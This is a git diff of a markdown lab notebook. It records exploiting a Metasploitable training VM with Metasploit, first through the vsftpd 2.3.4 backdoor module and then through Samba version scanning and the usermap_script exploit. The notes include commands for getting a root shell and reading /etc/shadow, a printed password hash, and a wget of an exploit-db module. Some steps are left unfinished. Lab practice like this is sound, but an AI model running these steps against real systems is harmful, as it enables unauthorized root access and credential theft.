@@ -110,11 +110,10 @@ Host script results:
 |_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
 ```
 
-## attemp 1: Use vsFTPd 2.3.4 bug: The attacker replaced the legitimate vsftpd-2.3.4.tar.gz archive with a malicious version.  
+## Attempt 1: Use vsFTPd 2.3.4 bug: The attacker replaced the legitimate vsftpd-2.3.4.tar.gz archive with a malicious version.  
 
 ```bash
 msfconsole
-
 
 use exploit/unix/ftp/vsftpd_234_backdoor  
 set RHOSTS 192.168.56.3
@@ -124,13 +123,14 @@ exploit --job
 session –l
 session -i 1
 
-# Get password hash 
+# Get password hash
+# actually we get the root shell directly, so we can just change the password
 cat /etc/shadow
 
 $1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
 ```
 
-```
+```log
 sessions ls
 
 Active sessions
@@ -156,4 +156,61 @@ whoami
 root
 ```
 
-## attemp 2
+## Attempt 2: Samba smbd 3.X - 4.X
+
+```bash
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.56.3
+set RPORT 139
+run
+# obtain version: Samba 3.0.20-Debian
+
+msf auxiliary(scanner/smb/smb_version) > search Samba 3.0.20
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.56.3
+set RPORT 445
+run
+
+# Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)
+wget https://www.exploit-db.com/download/42084
+
+sudo mv 42084.rb /usr/share/metasploit-framework/modules/exploits/custom/
+use auxiliary/scanner/smb/smb_version
+
+set RHOSTS 192.168.56.3
+set RPORT 
+Exploit to get the full-version
+
+use exploit/multi/samba/usermap_script
+
+set RHOSTS to target ip
+
+Exploit
+
+```
+
+```log
+msf exploit(unix/ftp/vsftpd_234_backdoor) > use auxiliary/scanner/smb/smb_version
+msf auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.56.3
+RHOSTS => 192.168.56.3
+msf auxiliary(scanner/smb/smb_version) > set RPORT 445
+RPORT => 445
+msf auxiliary(scanner/smb/smb_version) > run
+[*] 192.168.56.3:445      -   Host could not be identified: Unix (Samba 3.0.20-Debian)
+[*] 192.168.56.3          - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+msf auxiliary(scanner/smb/smb_version) > search  Samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+```
